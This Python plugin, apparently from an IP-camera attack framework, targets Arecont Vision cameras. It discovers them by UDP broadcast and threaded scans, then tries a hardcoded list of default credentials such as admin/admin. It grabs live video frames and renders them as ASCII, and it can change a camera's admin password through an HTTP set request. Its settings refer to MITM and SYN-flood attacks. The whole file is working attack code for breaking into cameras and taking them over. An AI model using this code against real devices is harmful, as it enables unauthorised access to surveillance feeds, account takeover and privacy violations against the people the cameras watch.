import sys, getopt
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.basicConfig()
sys.path.append('../')
#Have to import base class in this style as yapsy plugin class detection caveat. https://yapsy.readthedocs.org/en/latest/Advices.html#plugin-class-detection-caveat
import Cameras as pluginTypes
from scapy.all import *
import re
from Camera import Camera
from netaddr import *
import threading
import base64
import common # local lib file for common functions

class Arecont(pluginTypes.Cameras):
    #Arecont cameras will responde to discovery packet with this string in response
    magic_string = "Arecont_Vision-AV2000\x01"
    
    def __init__(self):
        pluginTypes.Cameras.__init__(self)
        self.list_of_creds = [
                                        {'username':'admin', 'password':'admin'}, 
                                        {'username':'admin', 'password':''}, 
                                        {'username':'viewer', 'password':'viewer'}, 
                                        ]

    def _doDiscovery(self):
        #UDP Broadcast scan?
        if self.dip == '255.255.255.255':
            self.__doDiscoveryBroadcast()
            cameras = copy.deepcopy(self.found_cameras)
            self.found_cameras = [] #reset broadcast discovery values
            for camera in cameras:
                self._getDetails(camera.ip)
        else:
            #scanning for single ip or list in file
            for myip in self._getNextIP():
                #restrict num of threads or we run out of mem
                while threading.active_count() > self.threads:
                    if self.debug is not None:
                        print "Waiting for free threads. %s threads used." % threading.active_count() 
                    time.sleep(2)
                t1 = threading.Thread(target=self._getDetails, args=[str(myip),self.username, self.password ])
                t1.start()
            #Wait till all threads are complete because scans my still be running when we reach this point
            while threading.active_count() > 1:
                if self.debug:
                    print "Active threads " + str(threading.active_count())
                time.sleep(2)

    """
    Use scapy to generate udp broadcast packet and arecont cameras on local subnet should reply.
    No user creds required for cameras to responde.
    #No return. Found cameras are saved in object found_cameras attribute.
    """
    def __doDiscoveryBroadcast(self):
        list_of_found_cameras = []
        if self.sip == None:
            raise Exception("Must specify source IP address or interface.")
        #This flag ensures that scapy will match on a broadcast
        conf.checkIPaddr=False
        answer, unanswer=srp( 
                             Ether(dst="ff:ff:ff:ff:ff:ff",type=0x800)/
                             IP(src=self.sip, dst=self.dip)/UDP(dport=self.dst_port,sport=61292)/
                             TFTP(self.magic_string),
                             multi=True,timeout=self.timeout_param, verbose=False)
        if answer:
            for send, reply in answer:
                for packet in reply:
                    payload = str(packet[3].load).decode("UTF-8", "ignore")
                    #Check if reply packet has magic_string
                    if self.__isUDPCamera(payload):
                        list_of_found_cameras.append(Camera(ip=packet[1].src, mac=packet[0].src) ) 
                        if self.debug is not None:
                            #IP layer details in array pos 1
                            print "Discovered Camera: IP " + packet[1].src + " MAC " + packet[0].src
                            print hexdump(payload)
            self.found_cameras = list_of_found_cameras

    """
    Try to connect to IP address to detmine if Arecont webcam.
    """
    def _getDetails(self, ip, username=None, password=None):
        if username is None:
            if self.username is not None:
                username = self.username
        if password is None:
            if self.password is not None:
                password = self.password

        global found_cameras
        model = 'Locked'
        fullname = 'Locked'
        mac = 'Locked'
        description = 'Arecont'
        camera_state = self._isCamera(ip) # check camera response with no creds
        
        if camera_state == 200: #unprotected camera
            model = self._getReleaseName(ip)
            fullname = self._getFullName(ip)
            mac = self._getMac(ip)
            username = 'BLANK'
            password = 'BLANK'
        elif camera_state == 401: #401 must mean authc required. Let's try to guess the creds.
            if self.debug:
                print 'Attempt to authenticate ' +ip
            if username is not None: #Did caller specify creds as param
                camera_state = self._isCamera(ip, username=username, password=password)
                if camera_state == 200:
                    model = self._getReleaseName(ip, username=username, password=password)
                    fullname = self._getFullName(ip, username=username, password=password)
                    mac = self._getMac(ip, username=username, password=password)
            #Did caller specify a password file using --pfile param?
            elif self.list_of_creds:
                if self.debug:
                    print self.list_of_creds
                for cred in self.list_of_creds:
                    camera_state = self._isCamera(ip, username=cred['username'], password=cred['password'])
                    if camera_state == 200:
                        model = self._getReleaseName(ip, username=cred['username'], password=cred['password'])
                        fullname = self._getFullName(ip, username=cred['username'], password=cred['password'])
                        mac = self._getMac(ip, username=cred['username'], password=cred['password'])
                        username = cred['username']
                        password = cred['password']
                        break
            #Can't crack creds so report as locked
        else: #Seems to not be a camera
            return
        self.found_cameras.append( Camera(ip=ip, model=model,  fullname=fullname, mac=mac, username=username, password=password, description=description) )

    """
    Try to determine if ip address is Arecont camera using web pages
    Return HTTP 200 if model string is returned from server or return 401 if auth is required. False if ip is not Arecont camera.
    """ 
    def _isCamera(self, ip, username=None, password=None):
        url = 'http://'+ip+'/get?model=releasename'
        page = self.getHTML(url, username=username, password=password)
        if self.debug:
            print page
        if page is not None:
            if page.status_code == 200:
                m = re.search('^model=(.+)', page.text)
                if m and m.group(1):
                    return 200
            elif page.status_code == 401:
                auth_header = page.headers.get('www-authenticate')
                m = re.search('realm=\"(Arecont Vision)', auth_header)
                if m and m.group(1):
                    return 401
        else:
            return False

    """Test if payload contains magic string that matches Arecont camera"""
    def __isUDPCamera(self, payload):
        m = re.search('^'+self.magic_string, payload)
        if m:
            return True
        else:
            return False

    def _doSetup(self, settings):
        self.sniff_timeout = 60 #scapy sniff timeout needs high value for mitm attack
        self.synflood_sleep_timer = 10

    #Return results and have a chance to format output
    def _doOutput(self):
        self.doDiscoveryBlockOutput()

    def _getFirmwareVersion(self, ip, username=None, password=None):
        url = 'http://'+ip+'/get?fwversion'
        page = self.getHTML(url, username=username, password=password)
        if page is not None and page.status_code == 200:
            m = re.search('.+?=(.+)', page.text)
            if m.group(1):
                return m.group(1)

    def _doStream(self):
        while True:
            print chr(27) + "[2J"
            print self._getAsciiImage(self.dip, self.username, self.password)
            time.sleep(0.2)

    def _getAsciiImage(self, ip, username=None, password=None):
        url = 'http://'+ip+'/image?res=half&x0=0&y0=0&x1=1920&y1=1200&quality=15&doublescan=0&ssn=1420671197290&id=1420671204959'
        page = self.getHTML(url, username=username, password=password)
        if page is not None and page.status_code == 200:
            fo = open("/tmp/image.jpg", "wb")
            fo.write( page.content);
            # Close opend file
            fo.close()
            return common.handle_image_conversion('/tmp/image.jpg')
        else:
            raise Exception("Problem connecting to stream")

    def _getMac(self, ip, username=None, password=None):
        url = 'http://'+ip+'/get?mac'
        page = self.getHTML(url, username=username, password=password)
        if page is not None and page.status_code == 200:
            m = re.search('.+?=(.+)', page.text)
            if m.group(1):
                return m.group(1)

    def _getReleaseName(self, ip, username=None, password=None):
        url = 'http://'+ip+'/get?model=releasename'
        page = self.getHTML(url, username=username, password=password)
        if page is not None and page.status_code == 200:
            m = re.search('.+?=(.+)', page.text)
            if m.group(1):
                return m.group(1)

    def _getFullName(self, ip, username=None, password=None):
        url = 'http://'+ip+'/get?model=fullname'
        page = self.getHTML(url, username=username, password=password)
        if page is not None and page.status_code == 200:
            m = re.search('.+?=(.+)', page.text)
            if m.group(1):
                return m.group(1)

    def _isCameraLocked(self, ip):
        release_name = self._getReleaseName(ip)
        if release_name == 401:
            return True
        else:
            return False

    def _setPassword(self, ip, username=None, password=None, new_password=None):
        url = 'http://'+ip+'/set?admin=' + new_password
        page = self.getHTML(url, username=username, password=password)
        if page is not None and page.status_code == 200:
            m = re.search('.+?=(.+)', page.text)
            if m.group(1):
                return m.group(1)
